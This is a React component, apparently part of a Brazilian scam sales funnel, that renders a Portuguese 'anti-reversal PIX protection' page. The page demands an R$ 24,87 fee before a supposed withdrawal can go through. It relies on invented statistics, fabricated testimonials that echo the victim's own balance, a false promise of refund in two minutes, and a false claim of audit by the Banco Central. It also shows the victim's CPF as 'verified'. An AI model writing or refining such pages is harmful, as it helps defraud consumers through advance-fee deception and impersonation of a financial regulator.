import { useState } from "react";
import { Loader2, Check, ChevronDown, ChevronUp } from "lucide-react";
import tiktokLogo from "@/assets/tiktok-logo.png";
import testimonial1 from "@/assets/testimonial-1.jpg";
import testimonial2 from "@/assets/testimonial-2.jpg";
import testimonial3 from "@/assets/testimonial-3.jpg";
import FunnelSecurityBadge from "./FunnelSecurityBadge";
import FunnelActiveUsersCounter from "./FunnelActiveUsersCounter";

interface FunnelUpsellAntiReversaoProps { balance: string; onGeneratePix: () => void; isGenerating: boolean; leadCpf?: string; leadName?: string; }
const FaqItem = ({ question, answer }: { question: string; answer: string }) => { const [open, setOpen] = useState(false); return (<div className="bg-white rounded-lg border border-gray-100 overflow-hidden"><button onClick={() => setOpen(!open)} className="w-full flex items-center justify-between p-3 text-left"><span className="text-gray-800 text-xs font-semibold pr-2">{question}</span>{open ? <ChevronUp className="w-4 h-4 text-gray-400 shrink-0" /> : <ChevronDown className="w-4 h-4 text-gray-400 shrink-0" />}</button>{open && <div className="px-3 pb-3 pt-0"><p className="text-gray-500 text-[11px] leading-relaxed">{answer}</p></div>}</div>); };
const TestimonialCard = ({ img, name, location, text, amount }: { img: string; name: string; location: string; text: string; amount: string }) => (<div className="bg-white rounded-lg p-3 border border-gray-100"><div className="flex items-center gap-2 mb-2"><img src={img} alt={name} className="w-8 h-8 rounded-full object-cover" loading="lazy" /><div><p className="text-gray-800 text-xs font-semibold">{name}</p><p className="text-gray-400 text-[10px]">{location}</p></div><span className="ml-auto text-green-600 text-[10px] font-bold">+{amount}</span></div><p className="text-gray-500 text-[11px] leading-relaxed">"{text}"</p></div>);

const FunnelUpsellAntiReversao = ({ balance, onGeneratePix, isGenerating, leadCpf, leadName }: FunnelUpsellAntiReversaoProps) => {
  return (
    <div className="fixed inset-0 z-[80] bg-[#F0F2F5] overflow-y-auto">
      <div className="bg-[#D32F2F] py-3 px-4"><h1 className="text-white text-sm font-bold text-center tracking-wide flex items-center justify-center gap-2">🛡️ PROTEÇÃO ANTI-REVERSÃO PIX</h1></div>
      <main className="px-3 py-4 max-w-lg mx-auto">
        {leadCpf && (<div className="bg-white rounded-xl p-3 mb-3 shadow-sm flex items-center gap-3 border border-green-100"><div className="w-8 h-8 rounded-full bg-green-50 flex items-center justify-center shrink-0"><span className="text-sm">🪪</span></div><div className="flex-1"><p className="text-gray-800 text-xs font-semibold">{leadName || "Titular"}</p><p className="text-gray-400 text-[11px]">CPF: {leadCpf}</p></div><span className="text-green-600 text-[10px] font-bold">Verificado ✓</span></div>)}
        <div className="bg-[#FFEBEE] border border-[#EF5350] rounded-xl p-4 mb-3"><div className="flex items-start gap-2"><span className="text-lg leading-none mt-0.5">⚠️</span><div><p className="text-gray-900 text-sm font-bold mb-1">Risco de Reversão</p><p className="text-gray-700 text-xs leading-relaxed"><span className="font-bold text-red-700">23% dos saques</span> sem proteção foram revertidos.</p></div></div></div>
        <div className="bg-white rounded-xl p-5 shadow-sm mb-3">
          <p className="text-gray-600 text-xs font-bold mb-2">A proteção garante:</p>
          <div className="space-y-2 mb-4">{["Blindagem contra reversão", "Confirmação dupla no BACEN", "Garantia de entrega em 2 min"].map((t, i) => (<div key={i} className="flex items-start gap-2"><Check className="w-4 h-4 text-green-500 mt-0.5 shrink-0" /><p className="text-gray-700 text-xs"><span className="font-bold">{t}</span></p></div>))}</div>
          <div className="bg-gray-50 rounded-lg p-3 mb-4 border border-gray-100"><div className="flex items-center justify-between mb-1"><span className="text-gray-500 text-[11px]">Taxa de proteção:</span><span className="text-gray-900 text-sm font-bold">R$ 24,87</span></div><div className="flex items-center justify-between"><span className="text-gray-500 text-[11px]">Reembolso:</span><span className="text-green-600 text-[11px] font-bold">✓ Em até 2 min</span></div></div>
          <button onClick={onGeneratePix} disabled={isGenerating} className="w-full py-3.5 rounded-xl bg-[#D32F2F] text-white font-bold text-sm tracking-wide hover:brightness-105 transition-all active:scale-[0.98] disabled:opacity-70 flex items-center justify-center gap-2 shadow-lg shadow-red-200" style={{ animation: isGenerating ? 'none' : 'ctaPulse 2s ease-in-out infinite' }}>{isGenerating ? (<><Loader2 className="w-4 h-4 animate-spin" />Gerando PIX...</>) : "Proteger Meu Saque →"}</button>
          <FunnelSecurityBadge />
        </div>
        <FunnelActiveUsersCounter />
        <div className="mb-3"><p className="text-gray-600 text-xs font-bold text-center mb-2">Perguntas frequentes</p><div className="space-y-2"><FaqItem question="O que é reversão de PIX?" answer="Ocorre quando o sistema bancário detecta inconsistência entre dados do titular e chave PIX." /><FaqItem question="A taxa é reembolsável?" answer="Sim, 100%. Retorna em até 2 minutos." /></div></div>
        <div className="mb-3"><p className="text-gray-600 text-xs font-bold text-center mb-2">Quem ativou, recebeu</p><div className="space-y-2"><TestimonialCard img={testimonial1} name="Roberto M." location="São Paulo, SP" text="Ativei a proteção e caiu em 1 minuto." amount={balance} /><TestimonialCard img={testimonial2} name="Fernanda L." location="Salvador, BA" text="Recebi tudo certinho com a proteção." amount={balance} /><TestimonialCard img={testimonial3} name="Diego S." location="Porto Alegre, RS" text="Ativei na hora e recebi sem problema." amount={balance} /></div></div>
        <div className="text-center pb-6"><p className="text-gray-400 text-[10px]">Protocolo auditado pelo Banco Central</p></div>
      </main>
      <style>{`@keyframes ctaPulse { 0%, 100% { transform: scale(1); box-shadow: 0 4px 15px rgba(211,47,47,0.3); } 50% { transform: scale(1.02); box-shadow: 0 6px 25px rgba(211,47,47,0.5); } }`}</style>
    </div>
  );
};

export default FunnelUpsellAntiReversao;
